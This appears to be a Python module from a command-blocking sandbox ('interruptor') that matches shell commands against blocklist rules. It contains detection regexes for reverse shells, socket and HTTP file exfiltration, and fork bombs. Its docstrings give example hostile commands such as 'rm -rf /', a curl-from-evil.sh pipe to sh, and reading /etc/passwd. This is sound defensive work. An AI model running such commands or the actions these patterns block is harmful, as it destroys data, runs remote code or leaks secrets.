"""Pattern matching engine for the interruptor.

Supports 9 match types: pattern, command, pipeline, subcommand, path,
composite, syscall, network, heredoc.

Defence against wrapper argv-quoting (E2E-001-GAP-05): the bash wrapper
``standalone/terminal-jail`` single-quotes every argv token when building
the command string sent to the interruptor bridge, e.g.::

    'rm' '-rf' '/'

The parser preserves those quote characters inside ``segment.raw``. Every
matcher below compares against a *quote-stripped* form of the raw text so
that blocklist patterns which depend on whitespace/operator boundaries
(such as ``r"rm\\s+rf\\s+/"``) still fire when the caller has wrapped
each argument in quotes.

The stripping is local to matching — ``segment.raw`` itself is never
mutated, so the modify path (which re-serialises the segment for
execution via the bridge) is unaffected.
"""

from __future__ import annotations

import re
from typing import Any

from .parser import Segment, SegmentType, is_sensitive_path

_QUOTED_TOKEN_RE = re.compile(r"^['\"](.*)['\"]$")

# Required-substring prefilters for the catastrophic-backtracking patterns
# (TJ-DF-024). Each entry lists ALTERNATIVE required literals: the pattern
# cannot match unless the candidate text contains AT LEAST ONE of them
# (casefolded on both sides to match the IGNORECASE search). When NONE is
# present the regex evaluation is skipped — absence of every alternative
# proves the pattern cannot match, so the skip is provably safe.
#
# Soundness contract, per entry:
# - The key must be the EXACT pattern string of the rule it describes. A
#   same-id user override whose pattern differs never hits the key and is
#   always evaluated — a stale or foreign pattern is never skipped by
#   someone else's prefilter.
# - Every listed literal must be LITERAL (casefold-stable) and the
#   first-match-lookahead of the pattern must be a disjunction of
#   alternatives each containing at least one listed literal. Socket-egress
#   rules: every alternative of their first lookahead contains "socket"
#   (even the bare ``socket\s*\(\s*\(`` form, i.e.
#   ``from socket import socket``). The HTTP-upload rule: every alternative
#   of its first lookahead contains one of "urlopen" / "requests" /
#   "httpx" / "urllib" / ".request(". The fork-bomb pattern matches the
#   backreference form ``name | name &`` — the literal "|" is unavoidable
#   in any match.
# - A rule pattern with NO entry here is ALWAYS evaluated. New rules are
#   therefore safe by default; adding a prefilter is an optimization with a
#   soundness obligation, never a requirement for correctness.
_PATTERN_PREFILTERS: dict[str, tuple[str, ...]] = {
    # builtin-fork-bomb
    "([A-Za-z_]\\w*|:)\\s*\\(\\s*\\)\\s*\\{[^}]*(?<![\\w:])\\1\\s*\\|\\s*\\1(?![\\w:])[^}]*&[^}]*\\}\\s*;\\s*\\1(?![\\w:])": (
        "|",
    ),
    # builtin-interp-egress-socket-shell
    "(?=[\\s\\S]*(?:\\bsocket\\.(?:socket|create_connection)\\s*\\(|\\bsocket\\s*\\(\\s*\\)))(?=[\\s\\S]*(?:\\.connect\\s*\\(|create_connection\\s*\\())(?=[\\s\\S]*(?:\\b(?:os\\.)?dup2\\s*\\(|\\bpty\\.spawn\\s*\\())": (
        "socket",
    ),
    # builtin-interp-egress-socket-file
    "(?=[\\s\\S]*(?:\\bsocket\\.(?:socket|create_connection)\\s*\\(|\\bsocket\\s*\\(\\s*\\)))(?=[\\s\\S]*\\.send(?:all|file)?\\s*\\()(?=[\\s\\S]*(?:open\\s*\\([^)]*\\)\\s*\\.read(?:lines)?\\s*\\(|open\\s*\\([^)]*,\\s*['\\\"][rb]{1,2}['\\\"]|read_bytes\\s*\\(|read_text\\s*\\())": (
        "socket",
    ),
    # builtin-interp-egress-http-file
    "(?=[\\s\\S]*(?:urlopen\\s*\\(|requests\\s*\\.\\s*(?:post|put|patch)\\s*\\(|httpx\\s*\\.\\s*(?:post|put|patch)\\s*\\(|http\\s*\\.\\s*client\\s*\\.|urllib\\s*\\.\\s*request\\s*\\.\\s*Request\\s*\\(|\\.request\\s*\\(\\s*['\\\"](?:POST|PUT|PATCH)['\\\"]))(?=[\\s\\S]*(?:open\\s*\\([^)]*\\)\\s*\\.read(?:lines)?\\s*\\(|open\\s*\\([^)]*,\\s*['\\\"][rb]{1,2}['\\\"]|read_bytes\\s*\\(|read_text\\s*\\())": (
        "urlopen",
        "requests",
        "httpx",
        "urllib",
        ".request(",
    ),
}


def _normalize_quoted(text: str) -> str:
    """Strip a single matched outer quote pair from each whitespace-separated token.

    Tokens wrapped entirely in matching single- or double-quote characters
    have those surrounding quotes removed. Inner quotes, unbalanced
    quotes, and bare tokens are left untouched. Tokens separated by
    whitespace are rejoined with single spaces.

    Examples:
        ``"'rm' '-rf' '/'"``           → ``"rm -rf /"``
        ``"'echo' 'hello world'"``     → ``"echo hello world"``
        ``'echo "can'"'t stop"'``      → ``'echo "can'"'t stop"'`` (inner quote kept)
        ``'rm -rf /'``                 → ``'rm -rf /'`` (no-op for bare text)
    """
    if not text:
        return text
    parts = text.split()
    out: list[str] = []
    for tok in parts:
        m = _QUOTED_TOKEN_RE.match(tok)
        if m is not None:
            out.append(m.group(1))
        else:
            out.append(tok)
    return " ".join(out)


class MatchResult:
    """Result of a pattern match attempt."""

    __slots__ = ("details", "matched", "matched_by")

    def __init__(
        self,
        matched: bool = False,
        matched_by: str = "",
        details: str = "",
    ) -> None:
        self.matched = matched
        self.matched_by = matched_by
        self.details = details

    def __bool__(self) -> bool:
        return self.matched

    def __repr__(self) -> str:
        return f"MatchResult(matched={self.matched}, matched_by={self.matched_by!r})"


class Matcher:
    """Matches parsed commands against rule match criteria."""

    def match_segment(self, segment: Segment, match_def: dict[str, Any]) -> MatchResult:
        """Check if a segment matches the given match definition.

        Args:
            segment: The parsed command segment to check.
            match_def: The match criteria from a rule (type + optional fields).

        Returns:
            MatchResult with match status and details.
        """
        match_type = match_def.get("type", "pattern")

        dispatch = {
            "pattern": self._match_pattern,
            "command": self._match_command,
            "pipeline": self._match_pipeline,
            "subcommand": self._match_subcommand,
            "path": self._match_path,
            "composite": self._match_composite,
            "syscall": self._match_syscall,
            "network": self._match_network,
            "heredoc": self._match_heredoc,
        }

        handler = dispatch.get(match_type)
        if handler is None:
            return MatchResult()

        return handler(segment, match_def)

    def _match_pattern(
        self, segment: Segment, match_def: dict[str, Any]
    ) -> MatchResult:
        """Match against a regex pattern.

        Tests the regex against both the literal ``segment.raw`` and a
        quote-stripped form so that blocklist patterns depending on
        whitespace/operator boundaries still fire when the bash wrapper
        has single-quoted every argv token (E2E-001-GAP-05).
        """
        pattern_str = match_def.get("pattern", "") or match_def.get("regex", "")
        if not pattern_str:
            return MatchResult()

        try:
            regex = re.compile(pattern_str, re.IGNORECASE)
        except re.error:
            return MatchResult()

        # Required-substring prefilter (TJ-DF-024): for patterns known to
        # backtrack catastrophically on long tokens, skip the regex
        # evaluation when NONE of the pattern's required alternative
        # literals is present — that absence proves the pattern cannot
        # match, so the skip is sound (see the soundness contract on
        # _PATTERN_PREFILTERS). Patterns without an entry are always
        # evaluated. Literals are casefolded to match the IGNORECASE
        # search (casefold is an over-approximation of lower here and
        # remains sound: if the casefolded haystack lacks the casefolded
        # needle, no case variant of the needle can be present).
        required = _PATTERN_PREFILTERS.get(pattern_str)
        candidates = (segment.raw, _normalize_quoted(segment.raw))
        for candidate in candidates:
            if required is not None:
                folded = candidate.casefold()
                if all(needle.casefold() not in folded for needle in required):
                    continue
            if regex.search(candidate):
                return MatchResult(
                    matched=True,
                    matched_by="pattern",
                    details=(f"Pattern '{pattern_str}' matched '{candidate}'"),
                )
        return MatchResult()

    def _match_command(
        self, segment: Segment, match_def: dict[str, Any]
    ) -> MatchResult:
        """Match against the top-level command (first word).

        Uses the quote-stripped raw so ``'sudo'`` matches the command
        ``sudo`` when the wrapper has single-quoted every argv token.
        """
        cmd_name = match_def.get("command", "")
        if not cmd_name:
            return MatchResult()

        normalized = _normalize_quoted(segment.raw)
        first_word = normalized.split()[0].lower() if normalized else ""
        return MatchResult(
            matched=first_word == cmd_name.lower(),
            matched_by="command" if first_word == cmd_name.lower() else "",
            details=(
                f"Command '{cmd_name}' matched '{first_word}'"
                if first_word == cmd_name.lower()
                else ""
            ),
        )

    def _match_pipeline(
        self, segment: Segment, match_def: dict[str, Any]
    ) -> MatchResult:
        """Match against pipeline segments.

        Splits the *quote-stripped* raw on ``|`` so that patterns using
        pipe boundaries match wrapper-quoted pipelines like
        ``'curl' 'http://evil.sh' '|' 'sh'``.
        """
        normalized = _normalize_quoted(segment.raw)
        if segment.type != SegmentType.PIPE:
            # For simple commands with pipe operators, check the raw text
            if "|" in normalized:
                parts = [p.strip() for p in normalized.split("|")]
                return self._check_pipeline_parts(parts, match_def)
            return MatchResult()

        # For pipe-type segments, split by pipe
        parts = [p.strip() for p in normalized.split("|")]
        return self._check_pipeline_parts(parts, match_def)

    def _check_pipeline_parts(
        self, parts: list[str], match_def: dict[str, Any]
    ) -> MatchResult:
        """Check pipeline parts against a pattern."""
        pattern_str = match_def.get("pattern", "")
        if not pattern_str:
            return MatchResult()

        try:
            regex = re.compile(pattern_str, re.IGNORECASE)
        except re.error:
            return MatchResult()

        for part in parts:
            if regex.search(part):
                return MatchResult(
                    matched=True,
                    matched_by="pipeline",
                    details=f"Pipeline part '{part}' matched '{pattern_str}'",
                )
        return MatchResult()

    def _match_subcommand(
        self, segment: Segment, match_def: dict[str, Any]
    ) -> MatchResult:
        """Match against subcommands (e.g., git push --force).

        Splits the *quote-stripped* raw so wrapper-quoted forms like
        ``'git' 'push' '--force'`` match a subcommand rule for ``push``.
        """
        normalized = _normalize_quoted(segment.raw)
        words = normalized.split()
        subcmd = match_def.get("subcommand", "")
        parent = match_def.get("parent", "")

        if not subcmd:
            return MatchResult()

        if parent and (not words or words[0].lower() != parent.lower()):
            return MatchResult()

        # Check if any word matches the subcommand
        for word in words:
            if word.lower() == subcmd.lower():
                return MatchResult(
                    matched=True,
                    matched_by="subcommand",
                    details=f"Subcommand '{subcmd}' found in '{normalized}'",
                )

        return MatchResult()

    def _match_path(self, segment: Segment, match_def: dict[str, Any]) -> MatchResult:
        """Match against file paths in arguments.

        Inspects the *quote-stripped* raw so wrapper-quoted arguments
        like ``'cat' '/etc/passwd'`` resolve the path correctly.
        """
        normalized = _normalize_quoted(segment.raw)
        path_pattern = match_def.get("path", "")
        if not path_pattern:
            # Default: check for sensitive paths
            words = normalized.split()
            for word in words:
                if "/" in word and is_sensitive_path(word):
                    return MatchResult(
                        matched=True,
                        matched_by="path",
                        details=f"Sensitive path '{word}' detected",
                    )
            return MatchResult()

        try:
            regex = re.compile(path_pattern, re.IGNORECASE)
        except re.error:
            return MatchResult()

        for word in normalized.split():
            if "/" in word and regex.search(word):
                return MatchResult(
                    matched=True,
                    matched_by="path",
                    details=f"Path '{word}' matched '{path_pattern}'",
                )
        return MatchResult()

    def _match_composite(
        self, segment: Segment, match_def: dict[str, Any]
    ) -> MatchResult:
        """Match composite AND/OR/NOT conditions."""
        conditions = match_def.get("conditions", [])
        operator = match_def.get("operator", "and").lower()
        not_condition = match_def.get("not", "")

        if not conditions and not not_condition:
            return MatchResult()

        # Check NOT condition first
        if not_condition:
            not_match = self._match_simple(segment, not_condition)
            if not_match.matched:
                return MatchResult()

        if not conditions:
            return MatchResult()

        results = [self._match_simple(segment, cond) for cond in conditions]

        if operator == "and":
            if all(results):
                return MatchResult(
                    matched=True,
                    matched_by="composite_and",
                    details=f"All {len(conditions)} AND conditions matched",
                )
        elif operator == "or":
            if any(results):
                return MatchResult(
                    matched=True,
                    matched_by="composite_or",
                    details=f"At least one of {len(conditions)} OR conditions matched",
                )
        elif operator == "not" and not any(results):
            return MatchResult(
                matched=True,
                matched_by="composite_not",
                details="None of the NOT conditions matched",
            )

        return MatchResult()

    def _match_simple(self, segment: Segment, condition: str | dict) -> MatchResult:
        """Match a simple condition (string or dict).

        Returns MatchResult (which is truthy on match).
        """
        normalized = _normalize_quoted(segment.raw)
        if isinstance(condition, str):
            matched = condition.lower() in normalized.lower()
            return MatchResult(
                matched=matched,
                matched_by="condition" if matched else "",
                details=f"Condition '{condition}' {'matched' if matched else 'not found'}",
            )
        if isinstance(condition, dict):
            return self.match_segment(segment, condition)
        return MatchResult()

    def _match_syscall(
        self, segment: Segment, match_def: dict[str, Any]
    ) -> MatchResult:
        """Match against likely syscall usage (heuristic).

        Compares against the *quote-stripped* raw so wrapper-quoted forms
        like ``'mount' '/dev/sda1'`` still detect ``mount``.
        """
        dangerous_commands = {
            "mount",
            "umount",
            "kexec",
            "insmod",
            "modprobe",
            "rmmod",
            "swapon",
            "swapoff",
            "sysctl",
            "dmesg",
            "reboot",
            "shutdown",
            "halt",
            "poweroff",
            "init",
        }
        normalized = _normalize_quoted(segment.raw)
        words = {w.lower() for w in normalized.split()}
        matched = words & dangerous_commands

        if matched:
            return MatchResult(
                matched=True,
                matched_by="syscall",
                details=f"Dangerous syscall command(s) detected: {', '.join(matched)}",
            )
        return MatchResult()

    def _match_network(
        self, segment: Segment, match_def: dict[str, Any]
    ) -> MatchResult:
        """Match against network addresses/URLs.

        Scans the *quote-stripped* raw so wrapper-quoted URLs/hosts are
        still detected.
        """
        ip_pattern = match_def.get("network", r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}")
        try:
            regex = re.compile(ip_pattern)
        except re.error:
            return MatchResult()

        normalized = _normalize_quoted(segment.raw)
        for word in normalized.split():
            if regex.search(word):
                return MatchResult(
                    matched=True,
                    matched_by="network",
                    details=f"Network address '{word}' matched pattern",
                )
        return MatchResult()

    def _match_heredoc(
        self, segment: Segment, match_def: dict[str, Any]
    ) -> MatchResult:
        """Match inside heredoc content.

        Heredoc bodies are not subject to the wrapper argv-quoting
        transform (the wrapper quotes argv tokens only), so the raw
        text is matched as-is.
        """
        pattern_str = match_def.get("pattern", "")
        if not pattern_str:
            return MatchResult()

        try:
            regex = re.compile(pattern_str, re.IGNORECASE)
        except re.error:
            return MatchResult()

        if segment.type == SegmentType.HEREDOC_CONTENT and regex.search(segment.raw):
            return MatchResult(
                matched=True,
                matched_by="heredoc",
                details=f"Heredoc content matched '{pattern_str}'",
            )
        return MatchResult()
